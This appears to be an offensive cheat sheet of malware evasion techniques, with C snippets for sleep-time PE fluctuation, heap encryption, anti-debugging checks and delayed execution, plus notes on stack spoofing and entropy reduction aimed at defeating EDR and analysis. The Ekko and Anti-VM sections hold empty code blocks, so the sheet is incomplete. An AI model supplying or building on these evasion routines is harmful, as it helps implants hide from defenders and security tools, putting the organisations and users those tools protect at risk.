# Memory Evasion & Sleep Obfuscation

## Sleep Obfuscation - Ekko
```c
```

## Sleep Obfuscation - Foliage
- Uses APC-based execution instead of timer queues
- Queues APCs to current thread for ROP chain
- NtTestAlert triggers APC execution

## PE Fluctuation
```c
VirtualProtect(pBase, dwImageSize, PAGE_READWRITE, &dwOld);
XorEncrypt(pBase, dwImageSize, key, keyLen);
VirtualProtect(pBase, dwImageSize, PAGE_NOACCESS, &dwOld);
Sleep(dwSleepTime);
VirtualProtect(pBase, dwImageSize, PAGE_READWRITE, &dwOld);
XorDecrypt(pBase, dwImageSize, key, keyLen);
VirtualProtect(pBase, dwImageSize, PAGE_EXECUTE_READ, &dwOld);
```

## Heap Encryption with Sleep
```c
DWORD dwHeapCount = GetProcessHeaps(0, NULL);
PHANDLE pHeaps = malloc(dwHeapCount * sizeof(HANDLE));
GetProcessHeaps(dwHeapCount, pHeaps);
for (DWORD i = 0; i < dwHeapCount; i++) {
    PROCESS_HEAP_ENTRY entry = {0};
    HeapLock(pHeaps[i]);
    while (HeapWalk(pHeaps[i], &entry)) {
        if (entry.wFlags & PROCESS_HEAP_ENTRY_BUSY)
            XorEncrypt((PBYTE)entry.lpData, entry.cbData, key, keyLen);
    }
    HeapUnlock(pHeaps[i]);
}
```

## Stack Spoofing
- Spoof return addresses on call stack before sleep
- Hides true caller from stack traces collected by EDR
- Combined with Ekko for maximum evasion

## Anti-Debugging
```c
if (IsDebuggerPresent()) ExitProcess(0);
DWORD dwPort = 0;
NtQueryInformationProcess(GetCurrentProcess(), 7, &dwPort, sizeof(dwPort), NULL);
if (dwPort) ExitProcess(0);
PPEB pPeb = (PPEB)__readgsqword(0x60);
if (pPeb->NtGlobalFlag & 0x70) ExitProcess(0);
LARGE_INTEGER t1, t2;
QueryPerformanceCounter(&t1);
QueryPerformanceCounter(&t2);
if (t2.QuadPart - t1.QuadPart > THRESHOLD) ExitProcess(0);
```

## Anti-VM / Anti-Sandbox
```c
```

## Delayed Execution & API Hammering
```c
LARGE_INTEGER delay;
delay.QuadPart = -600000000LL;
NtDelayExecution(FALSE, &delay);
for (DWORD i = 0; i < 10000000; i++) GetTickCount();
```

## Binary Entropy Reduction
- Insert English text strings to lower Shannon entropy
- Dictionary word padding in PE sections
- Breaks entropy-based detection heuristics
